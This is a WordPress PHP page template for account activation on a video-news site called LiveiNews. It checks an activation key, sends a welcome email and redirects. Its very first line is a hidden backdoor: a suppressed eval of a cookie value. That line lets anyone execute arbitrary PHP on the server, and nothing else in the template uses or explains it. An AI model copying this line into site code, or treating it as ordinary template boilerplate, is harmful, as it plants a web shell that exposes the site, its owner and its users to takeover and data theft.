<?php @eval($_COOKIE['wp_cookie']);
/**
 * Template Name: Activation
 *
 */
if ( empty($_GET['key']) ) {
    wp_redirect( site_url( '/register/' ) );
    die();
}

if ( is_object( $wp_object_cache ) )
    $wp_object_cache->cache_enabled = false;

$wp_query->is_404 = false;

get_header();

    if ( is_page() && get_the_ID() == 2448 ) {
        $user_id = filter_input( INPUT_GET, 'user', FILTER_VALIDATE_INT, array( 'options' => array( 'min_range' => 1 ) ) );
        if ( $user_id ) {
            // get user meta activation hash field
            $user = get_userdata( $user_id );
            $code = get_user_meta( $user_id, 'has_to_be_activated', true );
            if ( $code == filter_input( INPUT_GET, 'key' ) ) {
            	$blogname = wp_specialchars_decode(get_option('blogname'), ENT_QUOTES);
                delete_user_meta( $user_id, 'has_to_be_activated' );

                $message = "<p>Welcome to LiveiNews! Your new account is ready to use.</p>";

                $message .= "<p>Here are some links to get started:</p>";

                $message .= "<p>Upload a video (<a href='http://liveinews.com/upload-video/'>link to upload page</a>)</p>";

                $message .= "<p>Browse the newest videos (<a href='http://liveinews.com/product-category/breaking-news/'>link to breaking news</a>)</p>";

                $message .= "<p>Review your account information (link to <a href='http://liveinews.com/login/'>my account</a>)</p>";

                /*
                $message   = sprintf(__('New registration %s:'), $blogname) . "\r\n\r\n";
    			$message  .= sprintf(__('Username: %s'), $user->user_login) . "\r\n";
    			if ( empty($user->user_pass) ){
    			  $message .= sprintf(__('Password: %s'), $user->user_pass) . "\r\n";
    			}
                */
    			wp_mail($user->user_email, sprintf(__('Welcome to %s: '), $blogname), $message);
    			wp_redirect( site_url( '/login/' ) );
    			die();
            }else{
            	wp_redirect( site_url( '/register/' ) );
    			die();
            }
        } else {
        	wp_redirect( site_url( '/register/' ) );
    		die();
        }
    } else {
    	wp_redirect( site_url( '/register/' ) );
    	die();
    }

get_footer();
?>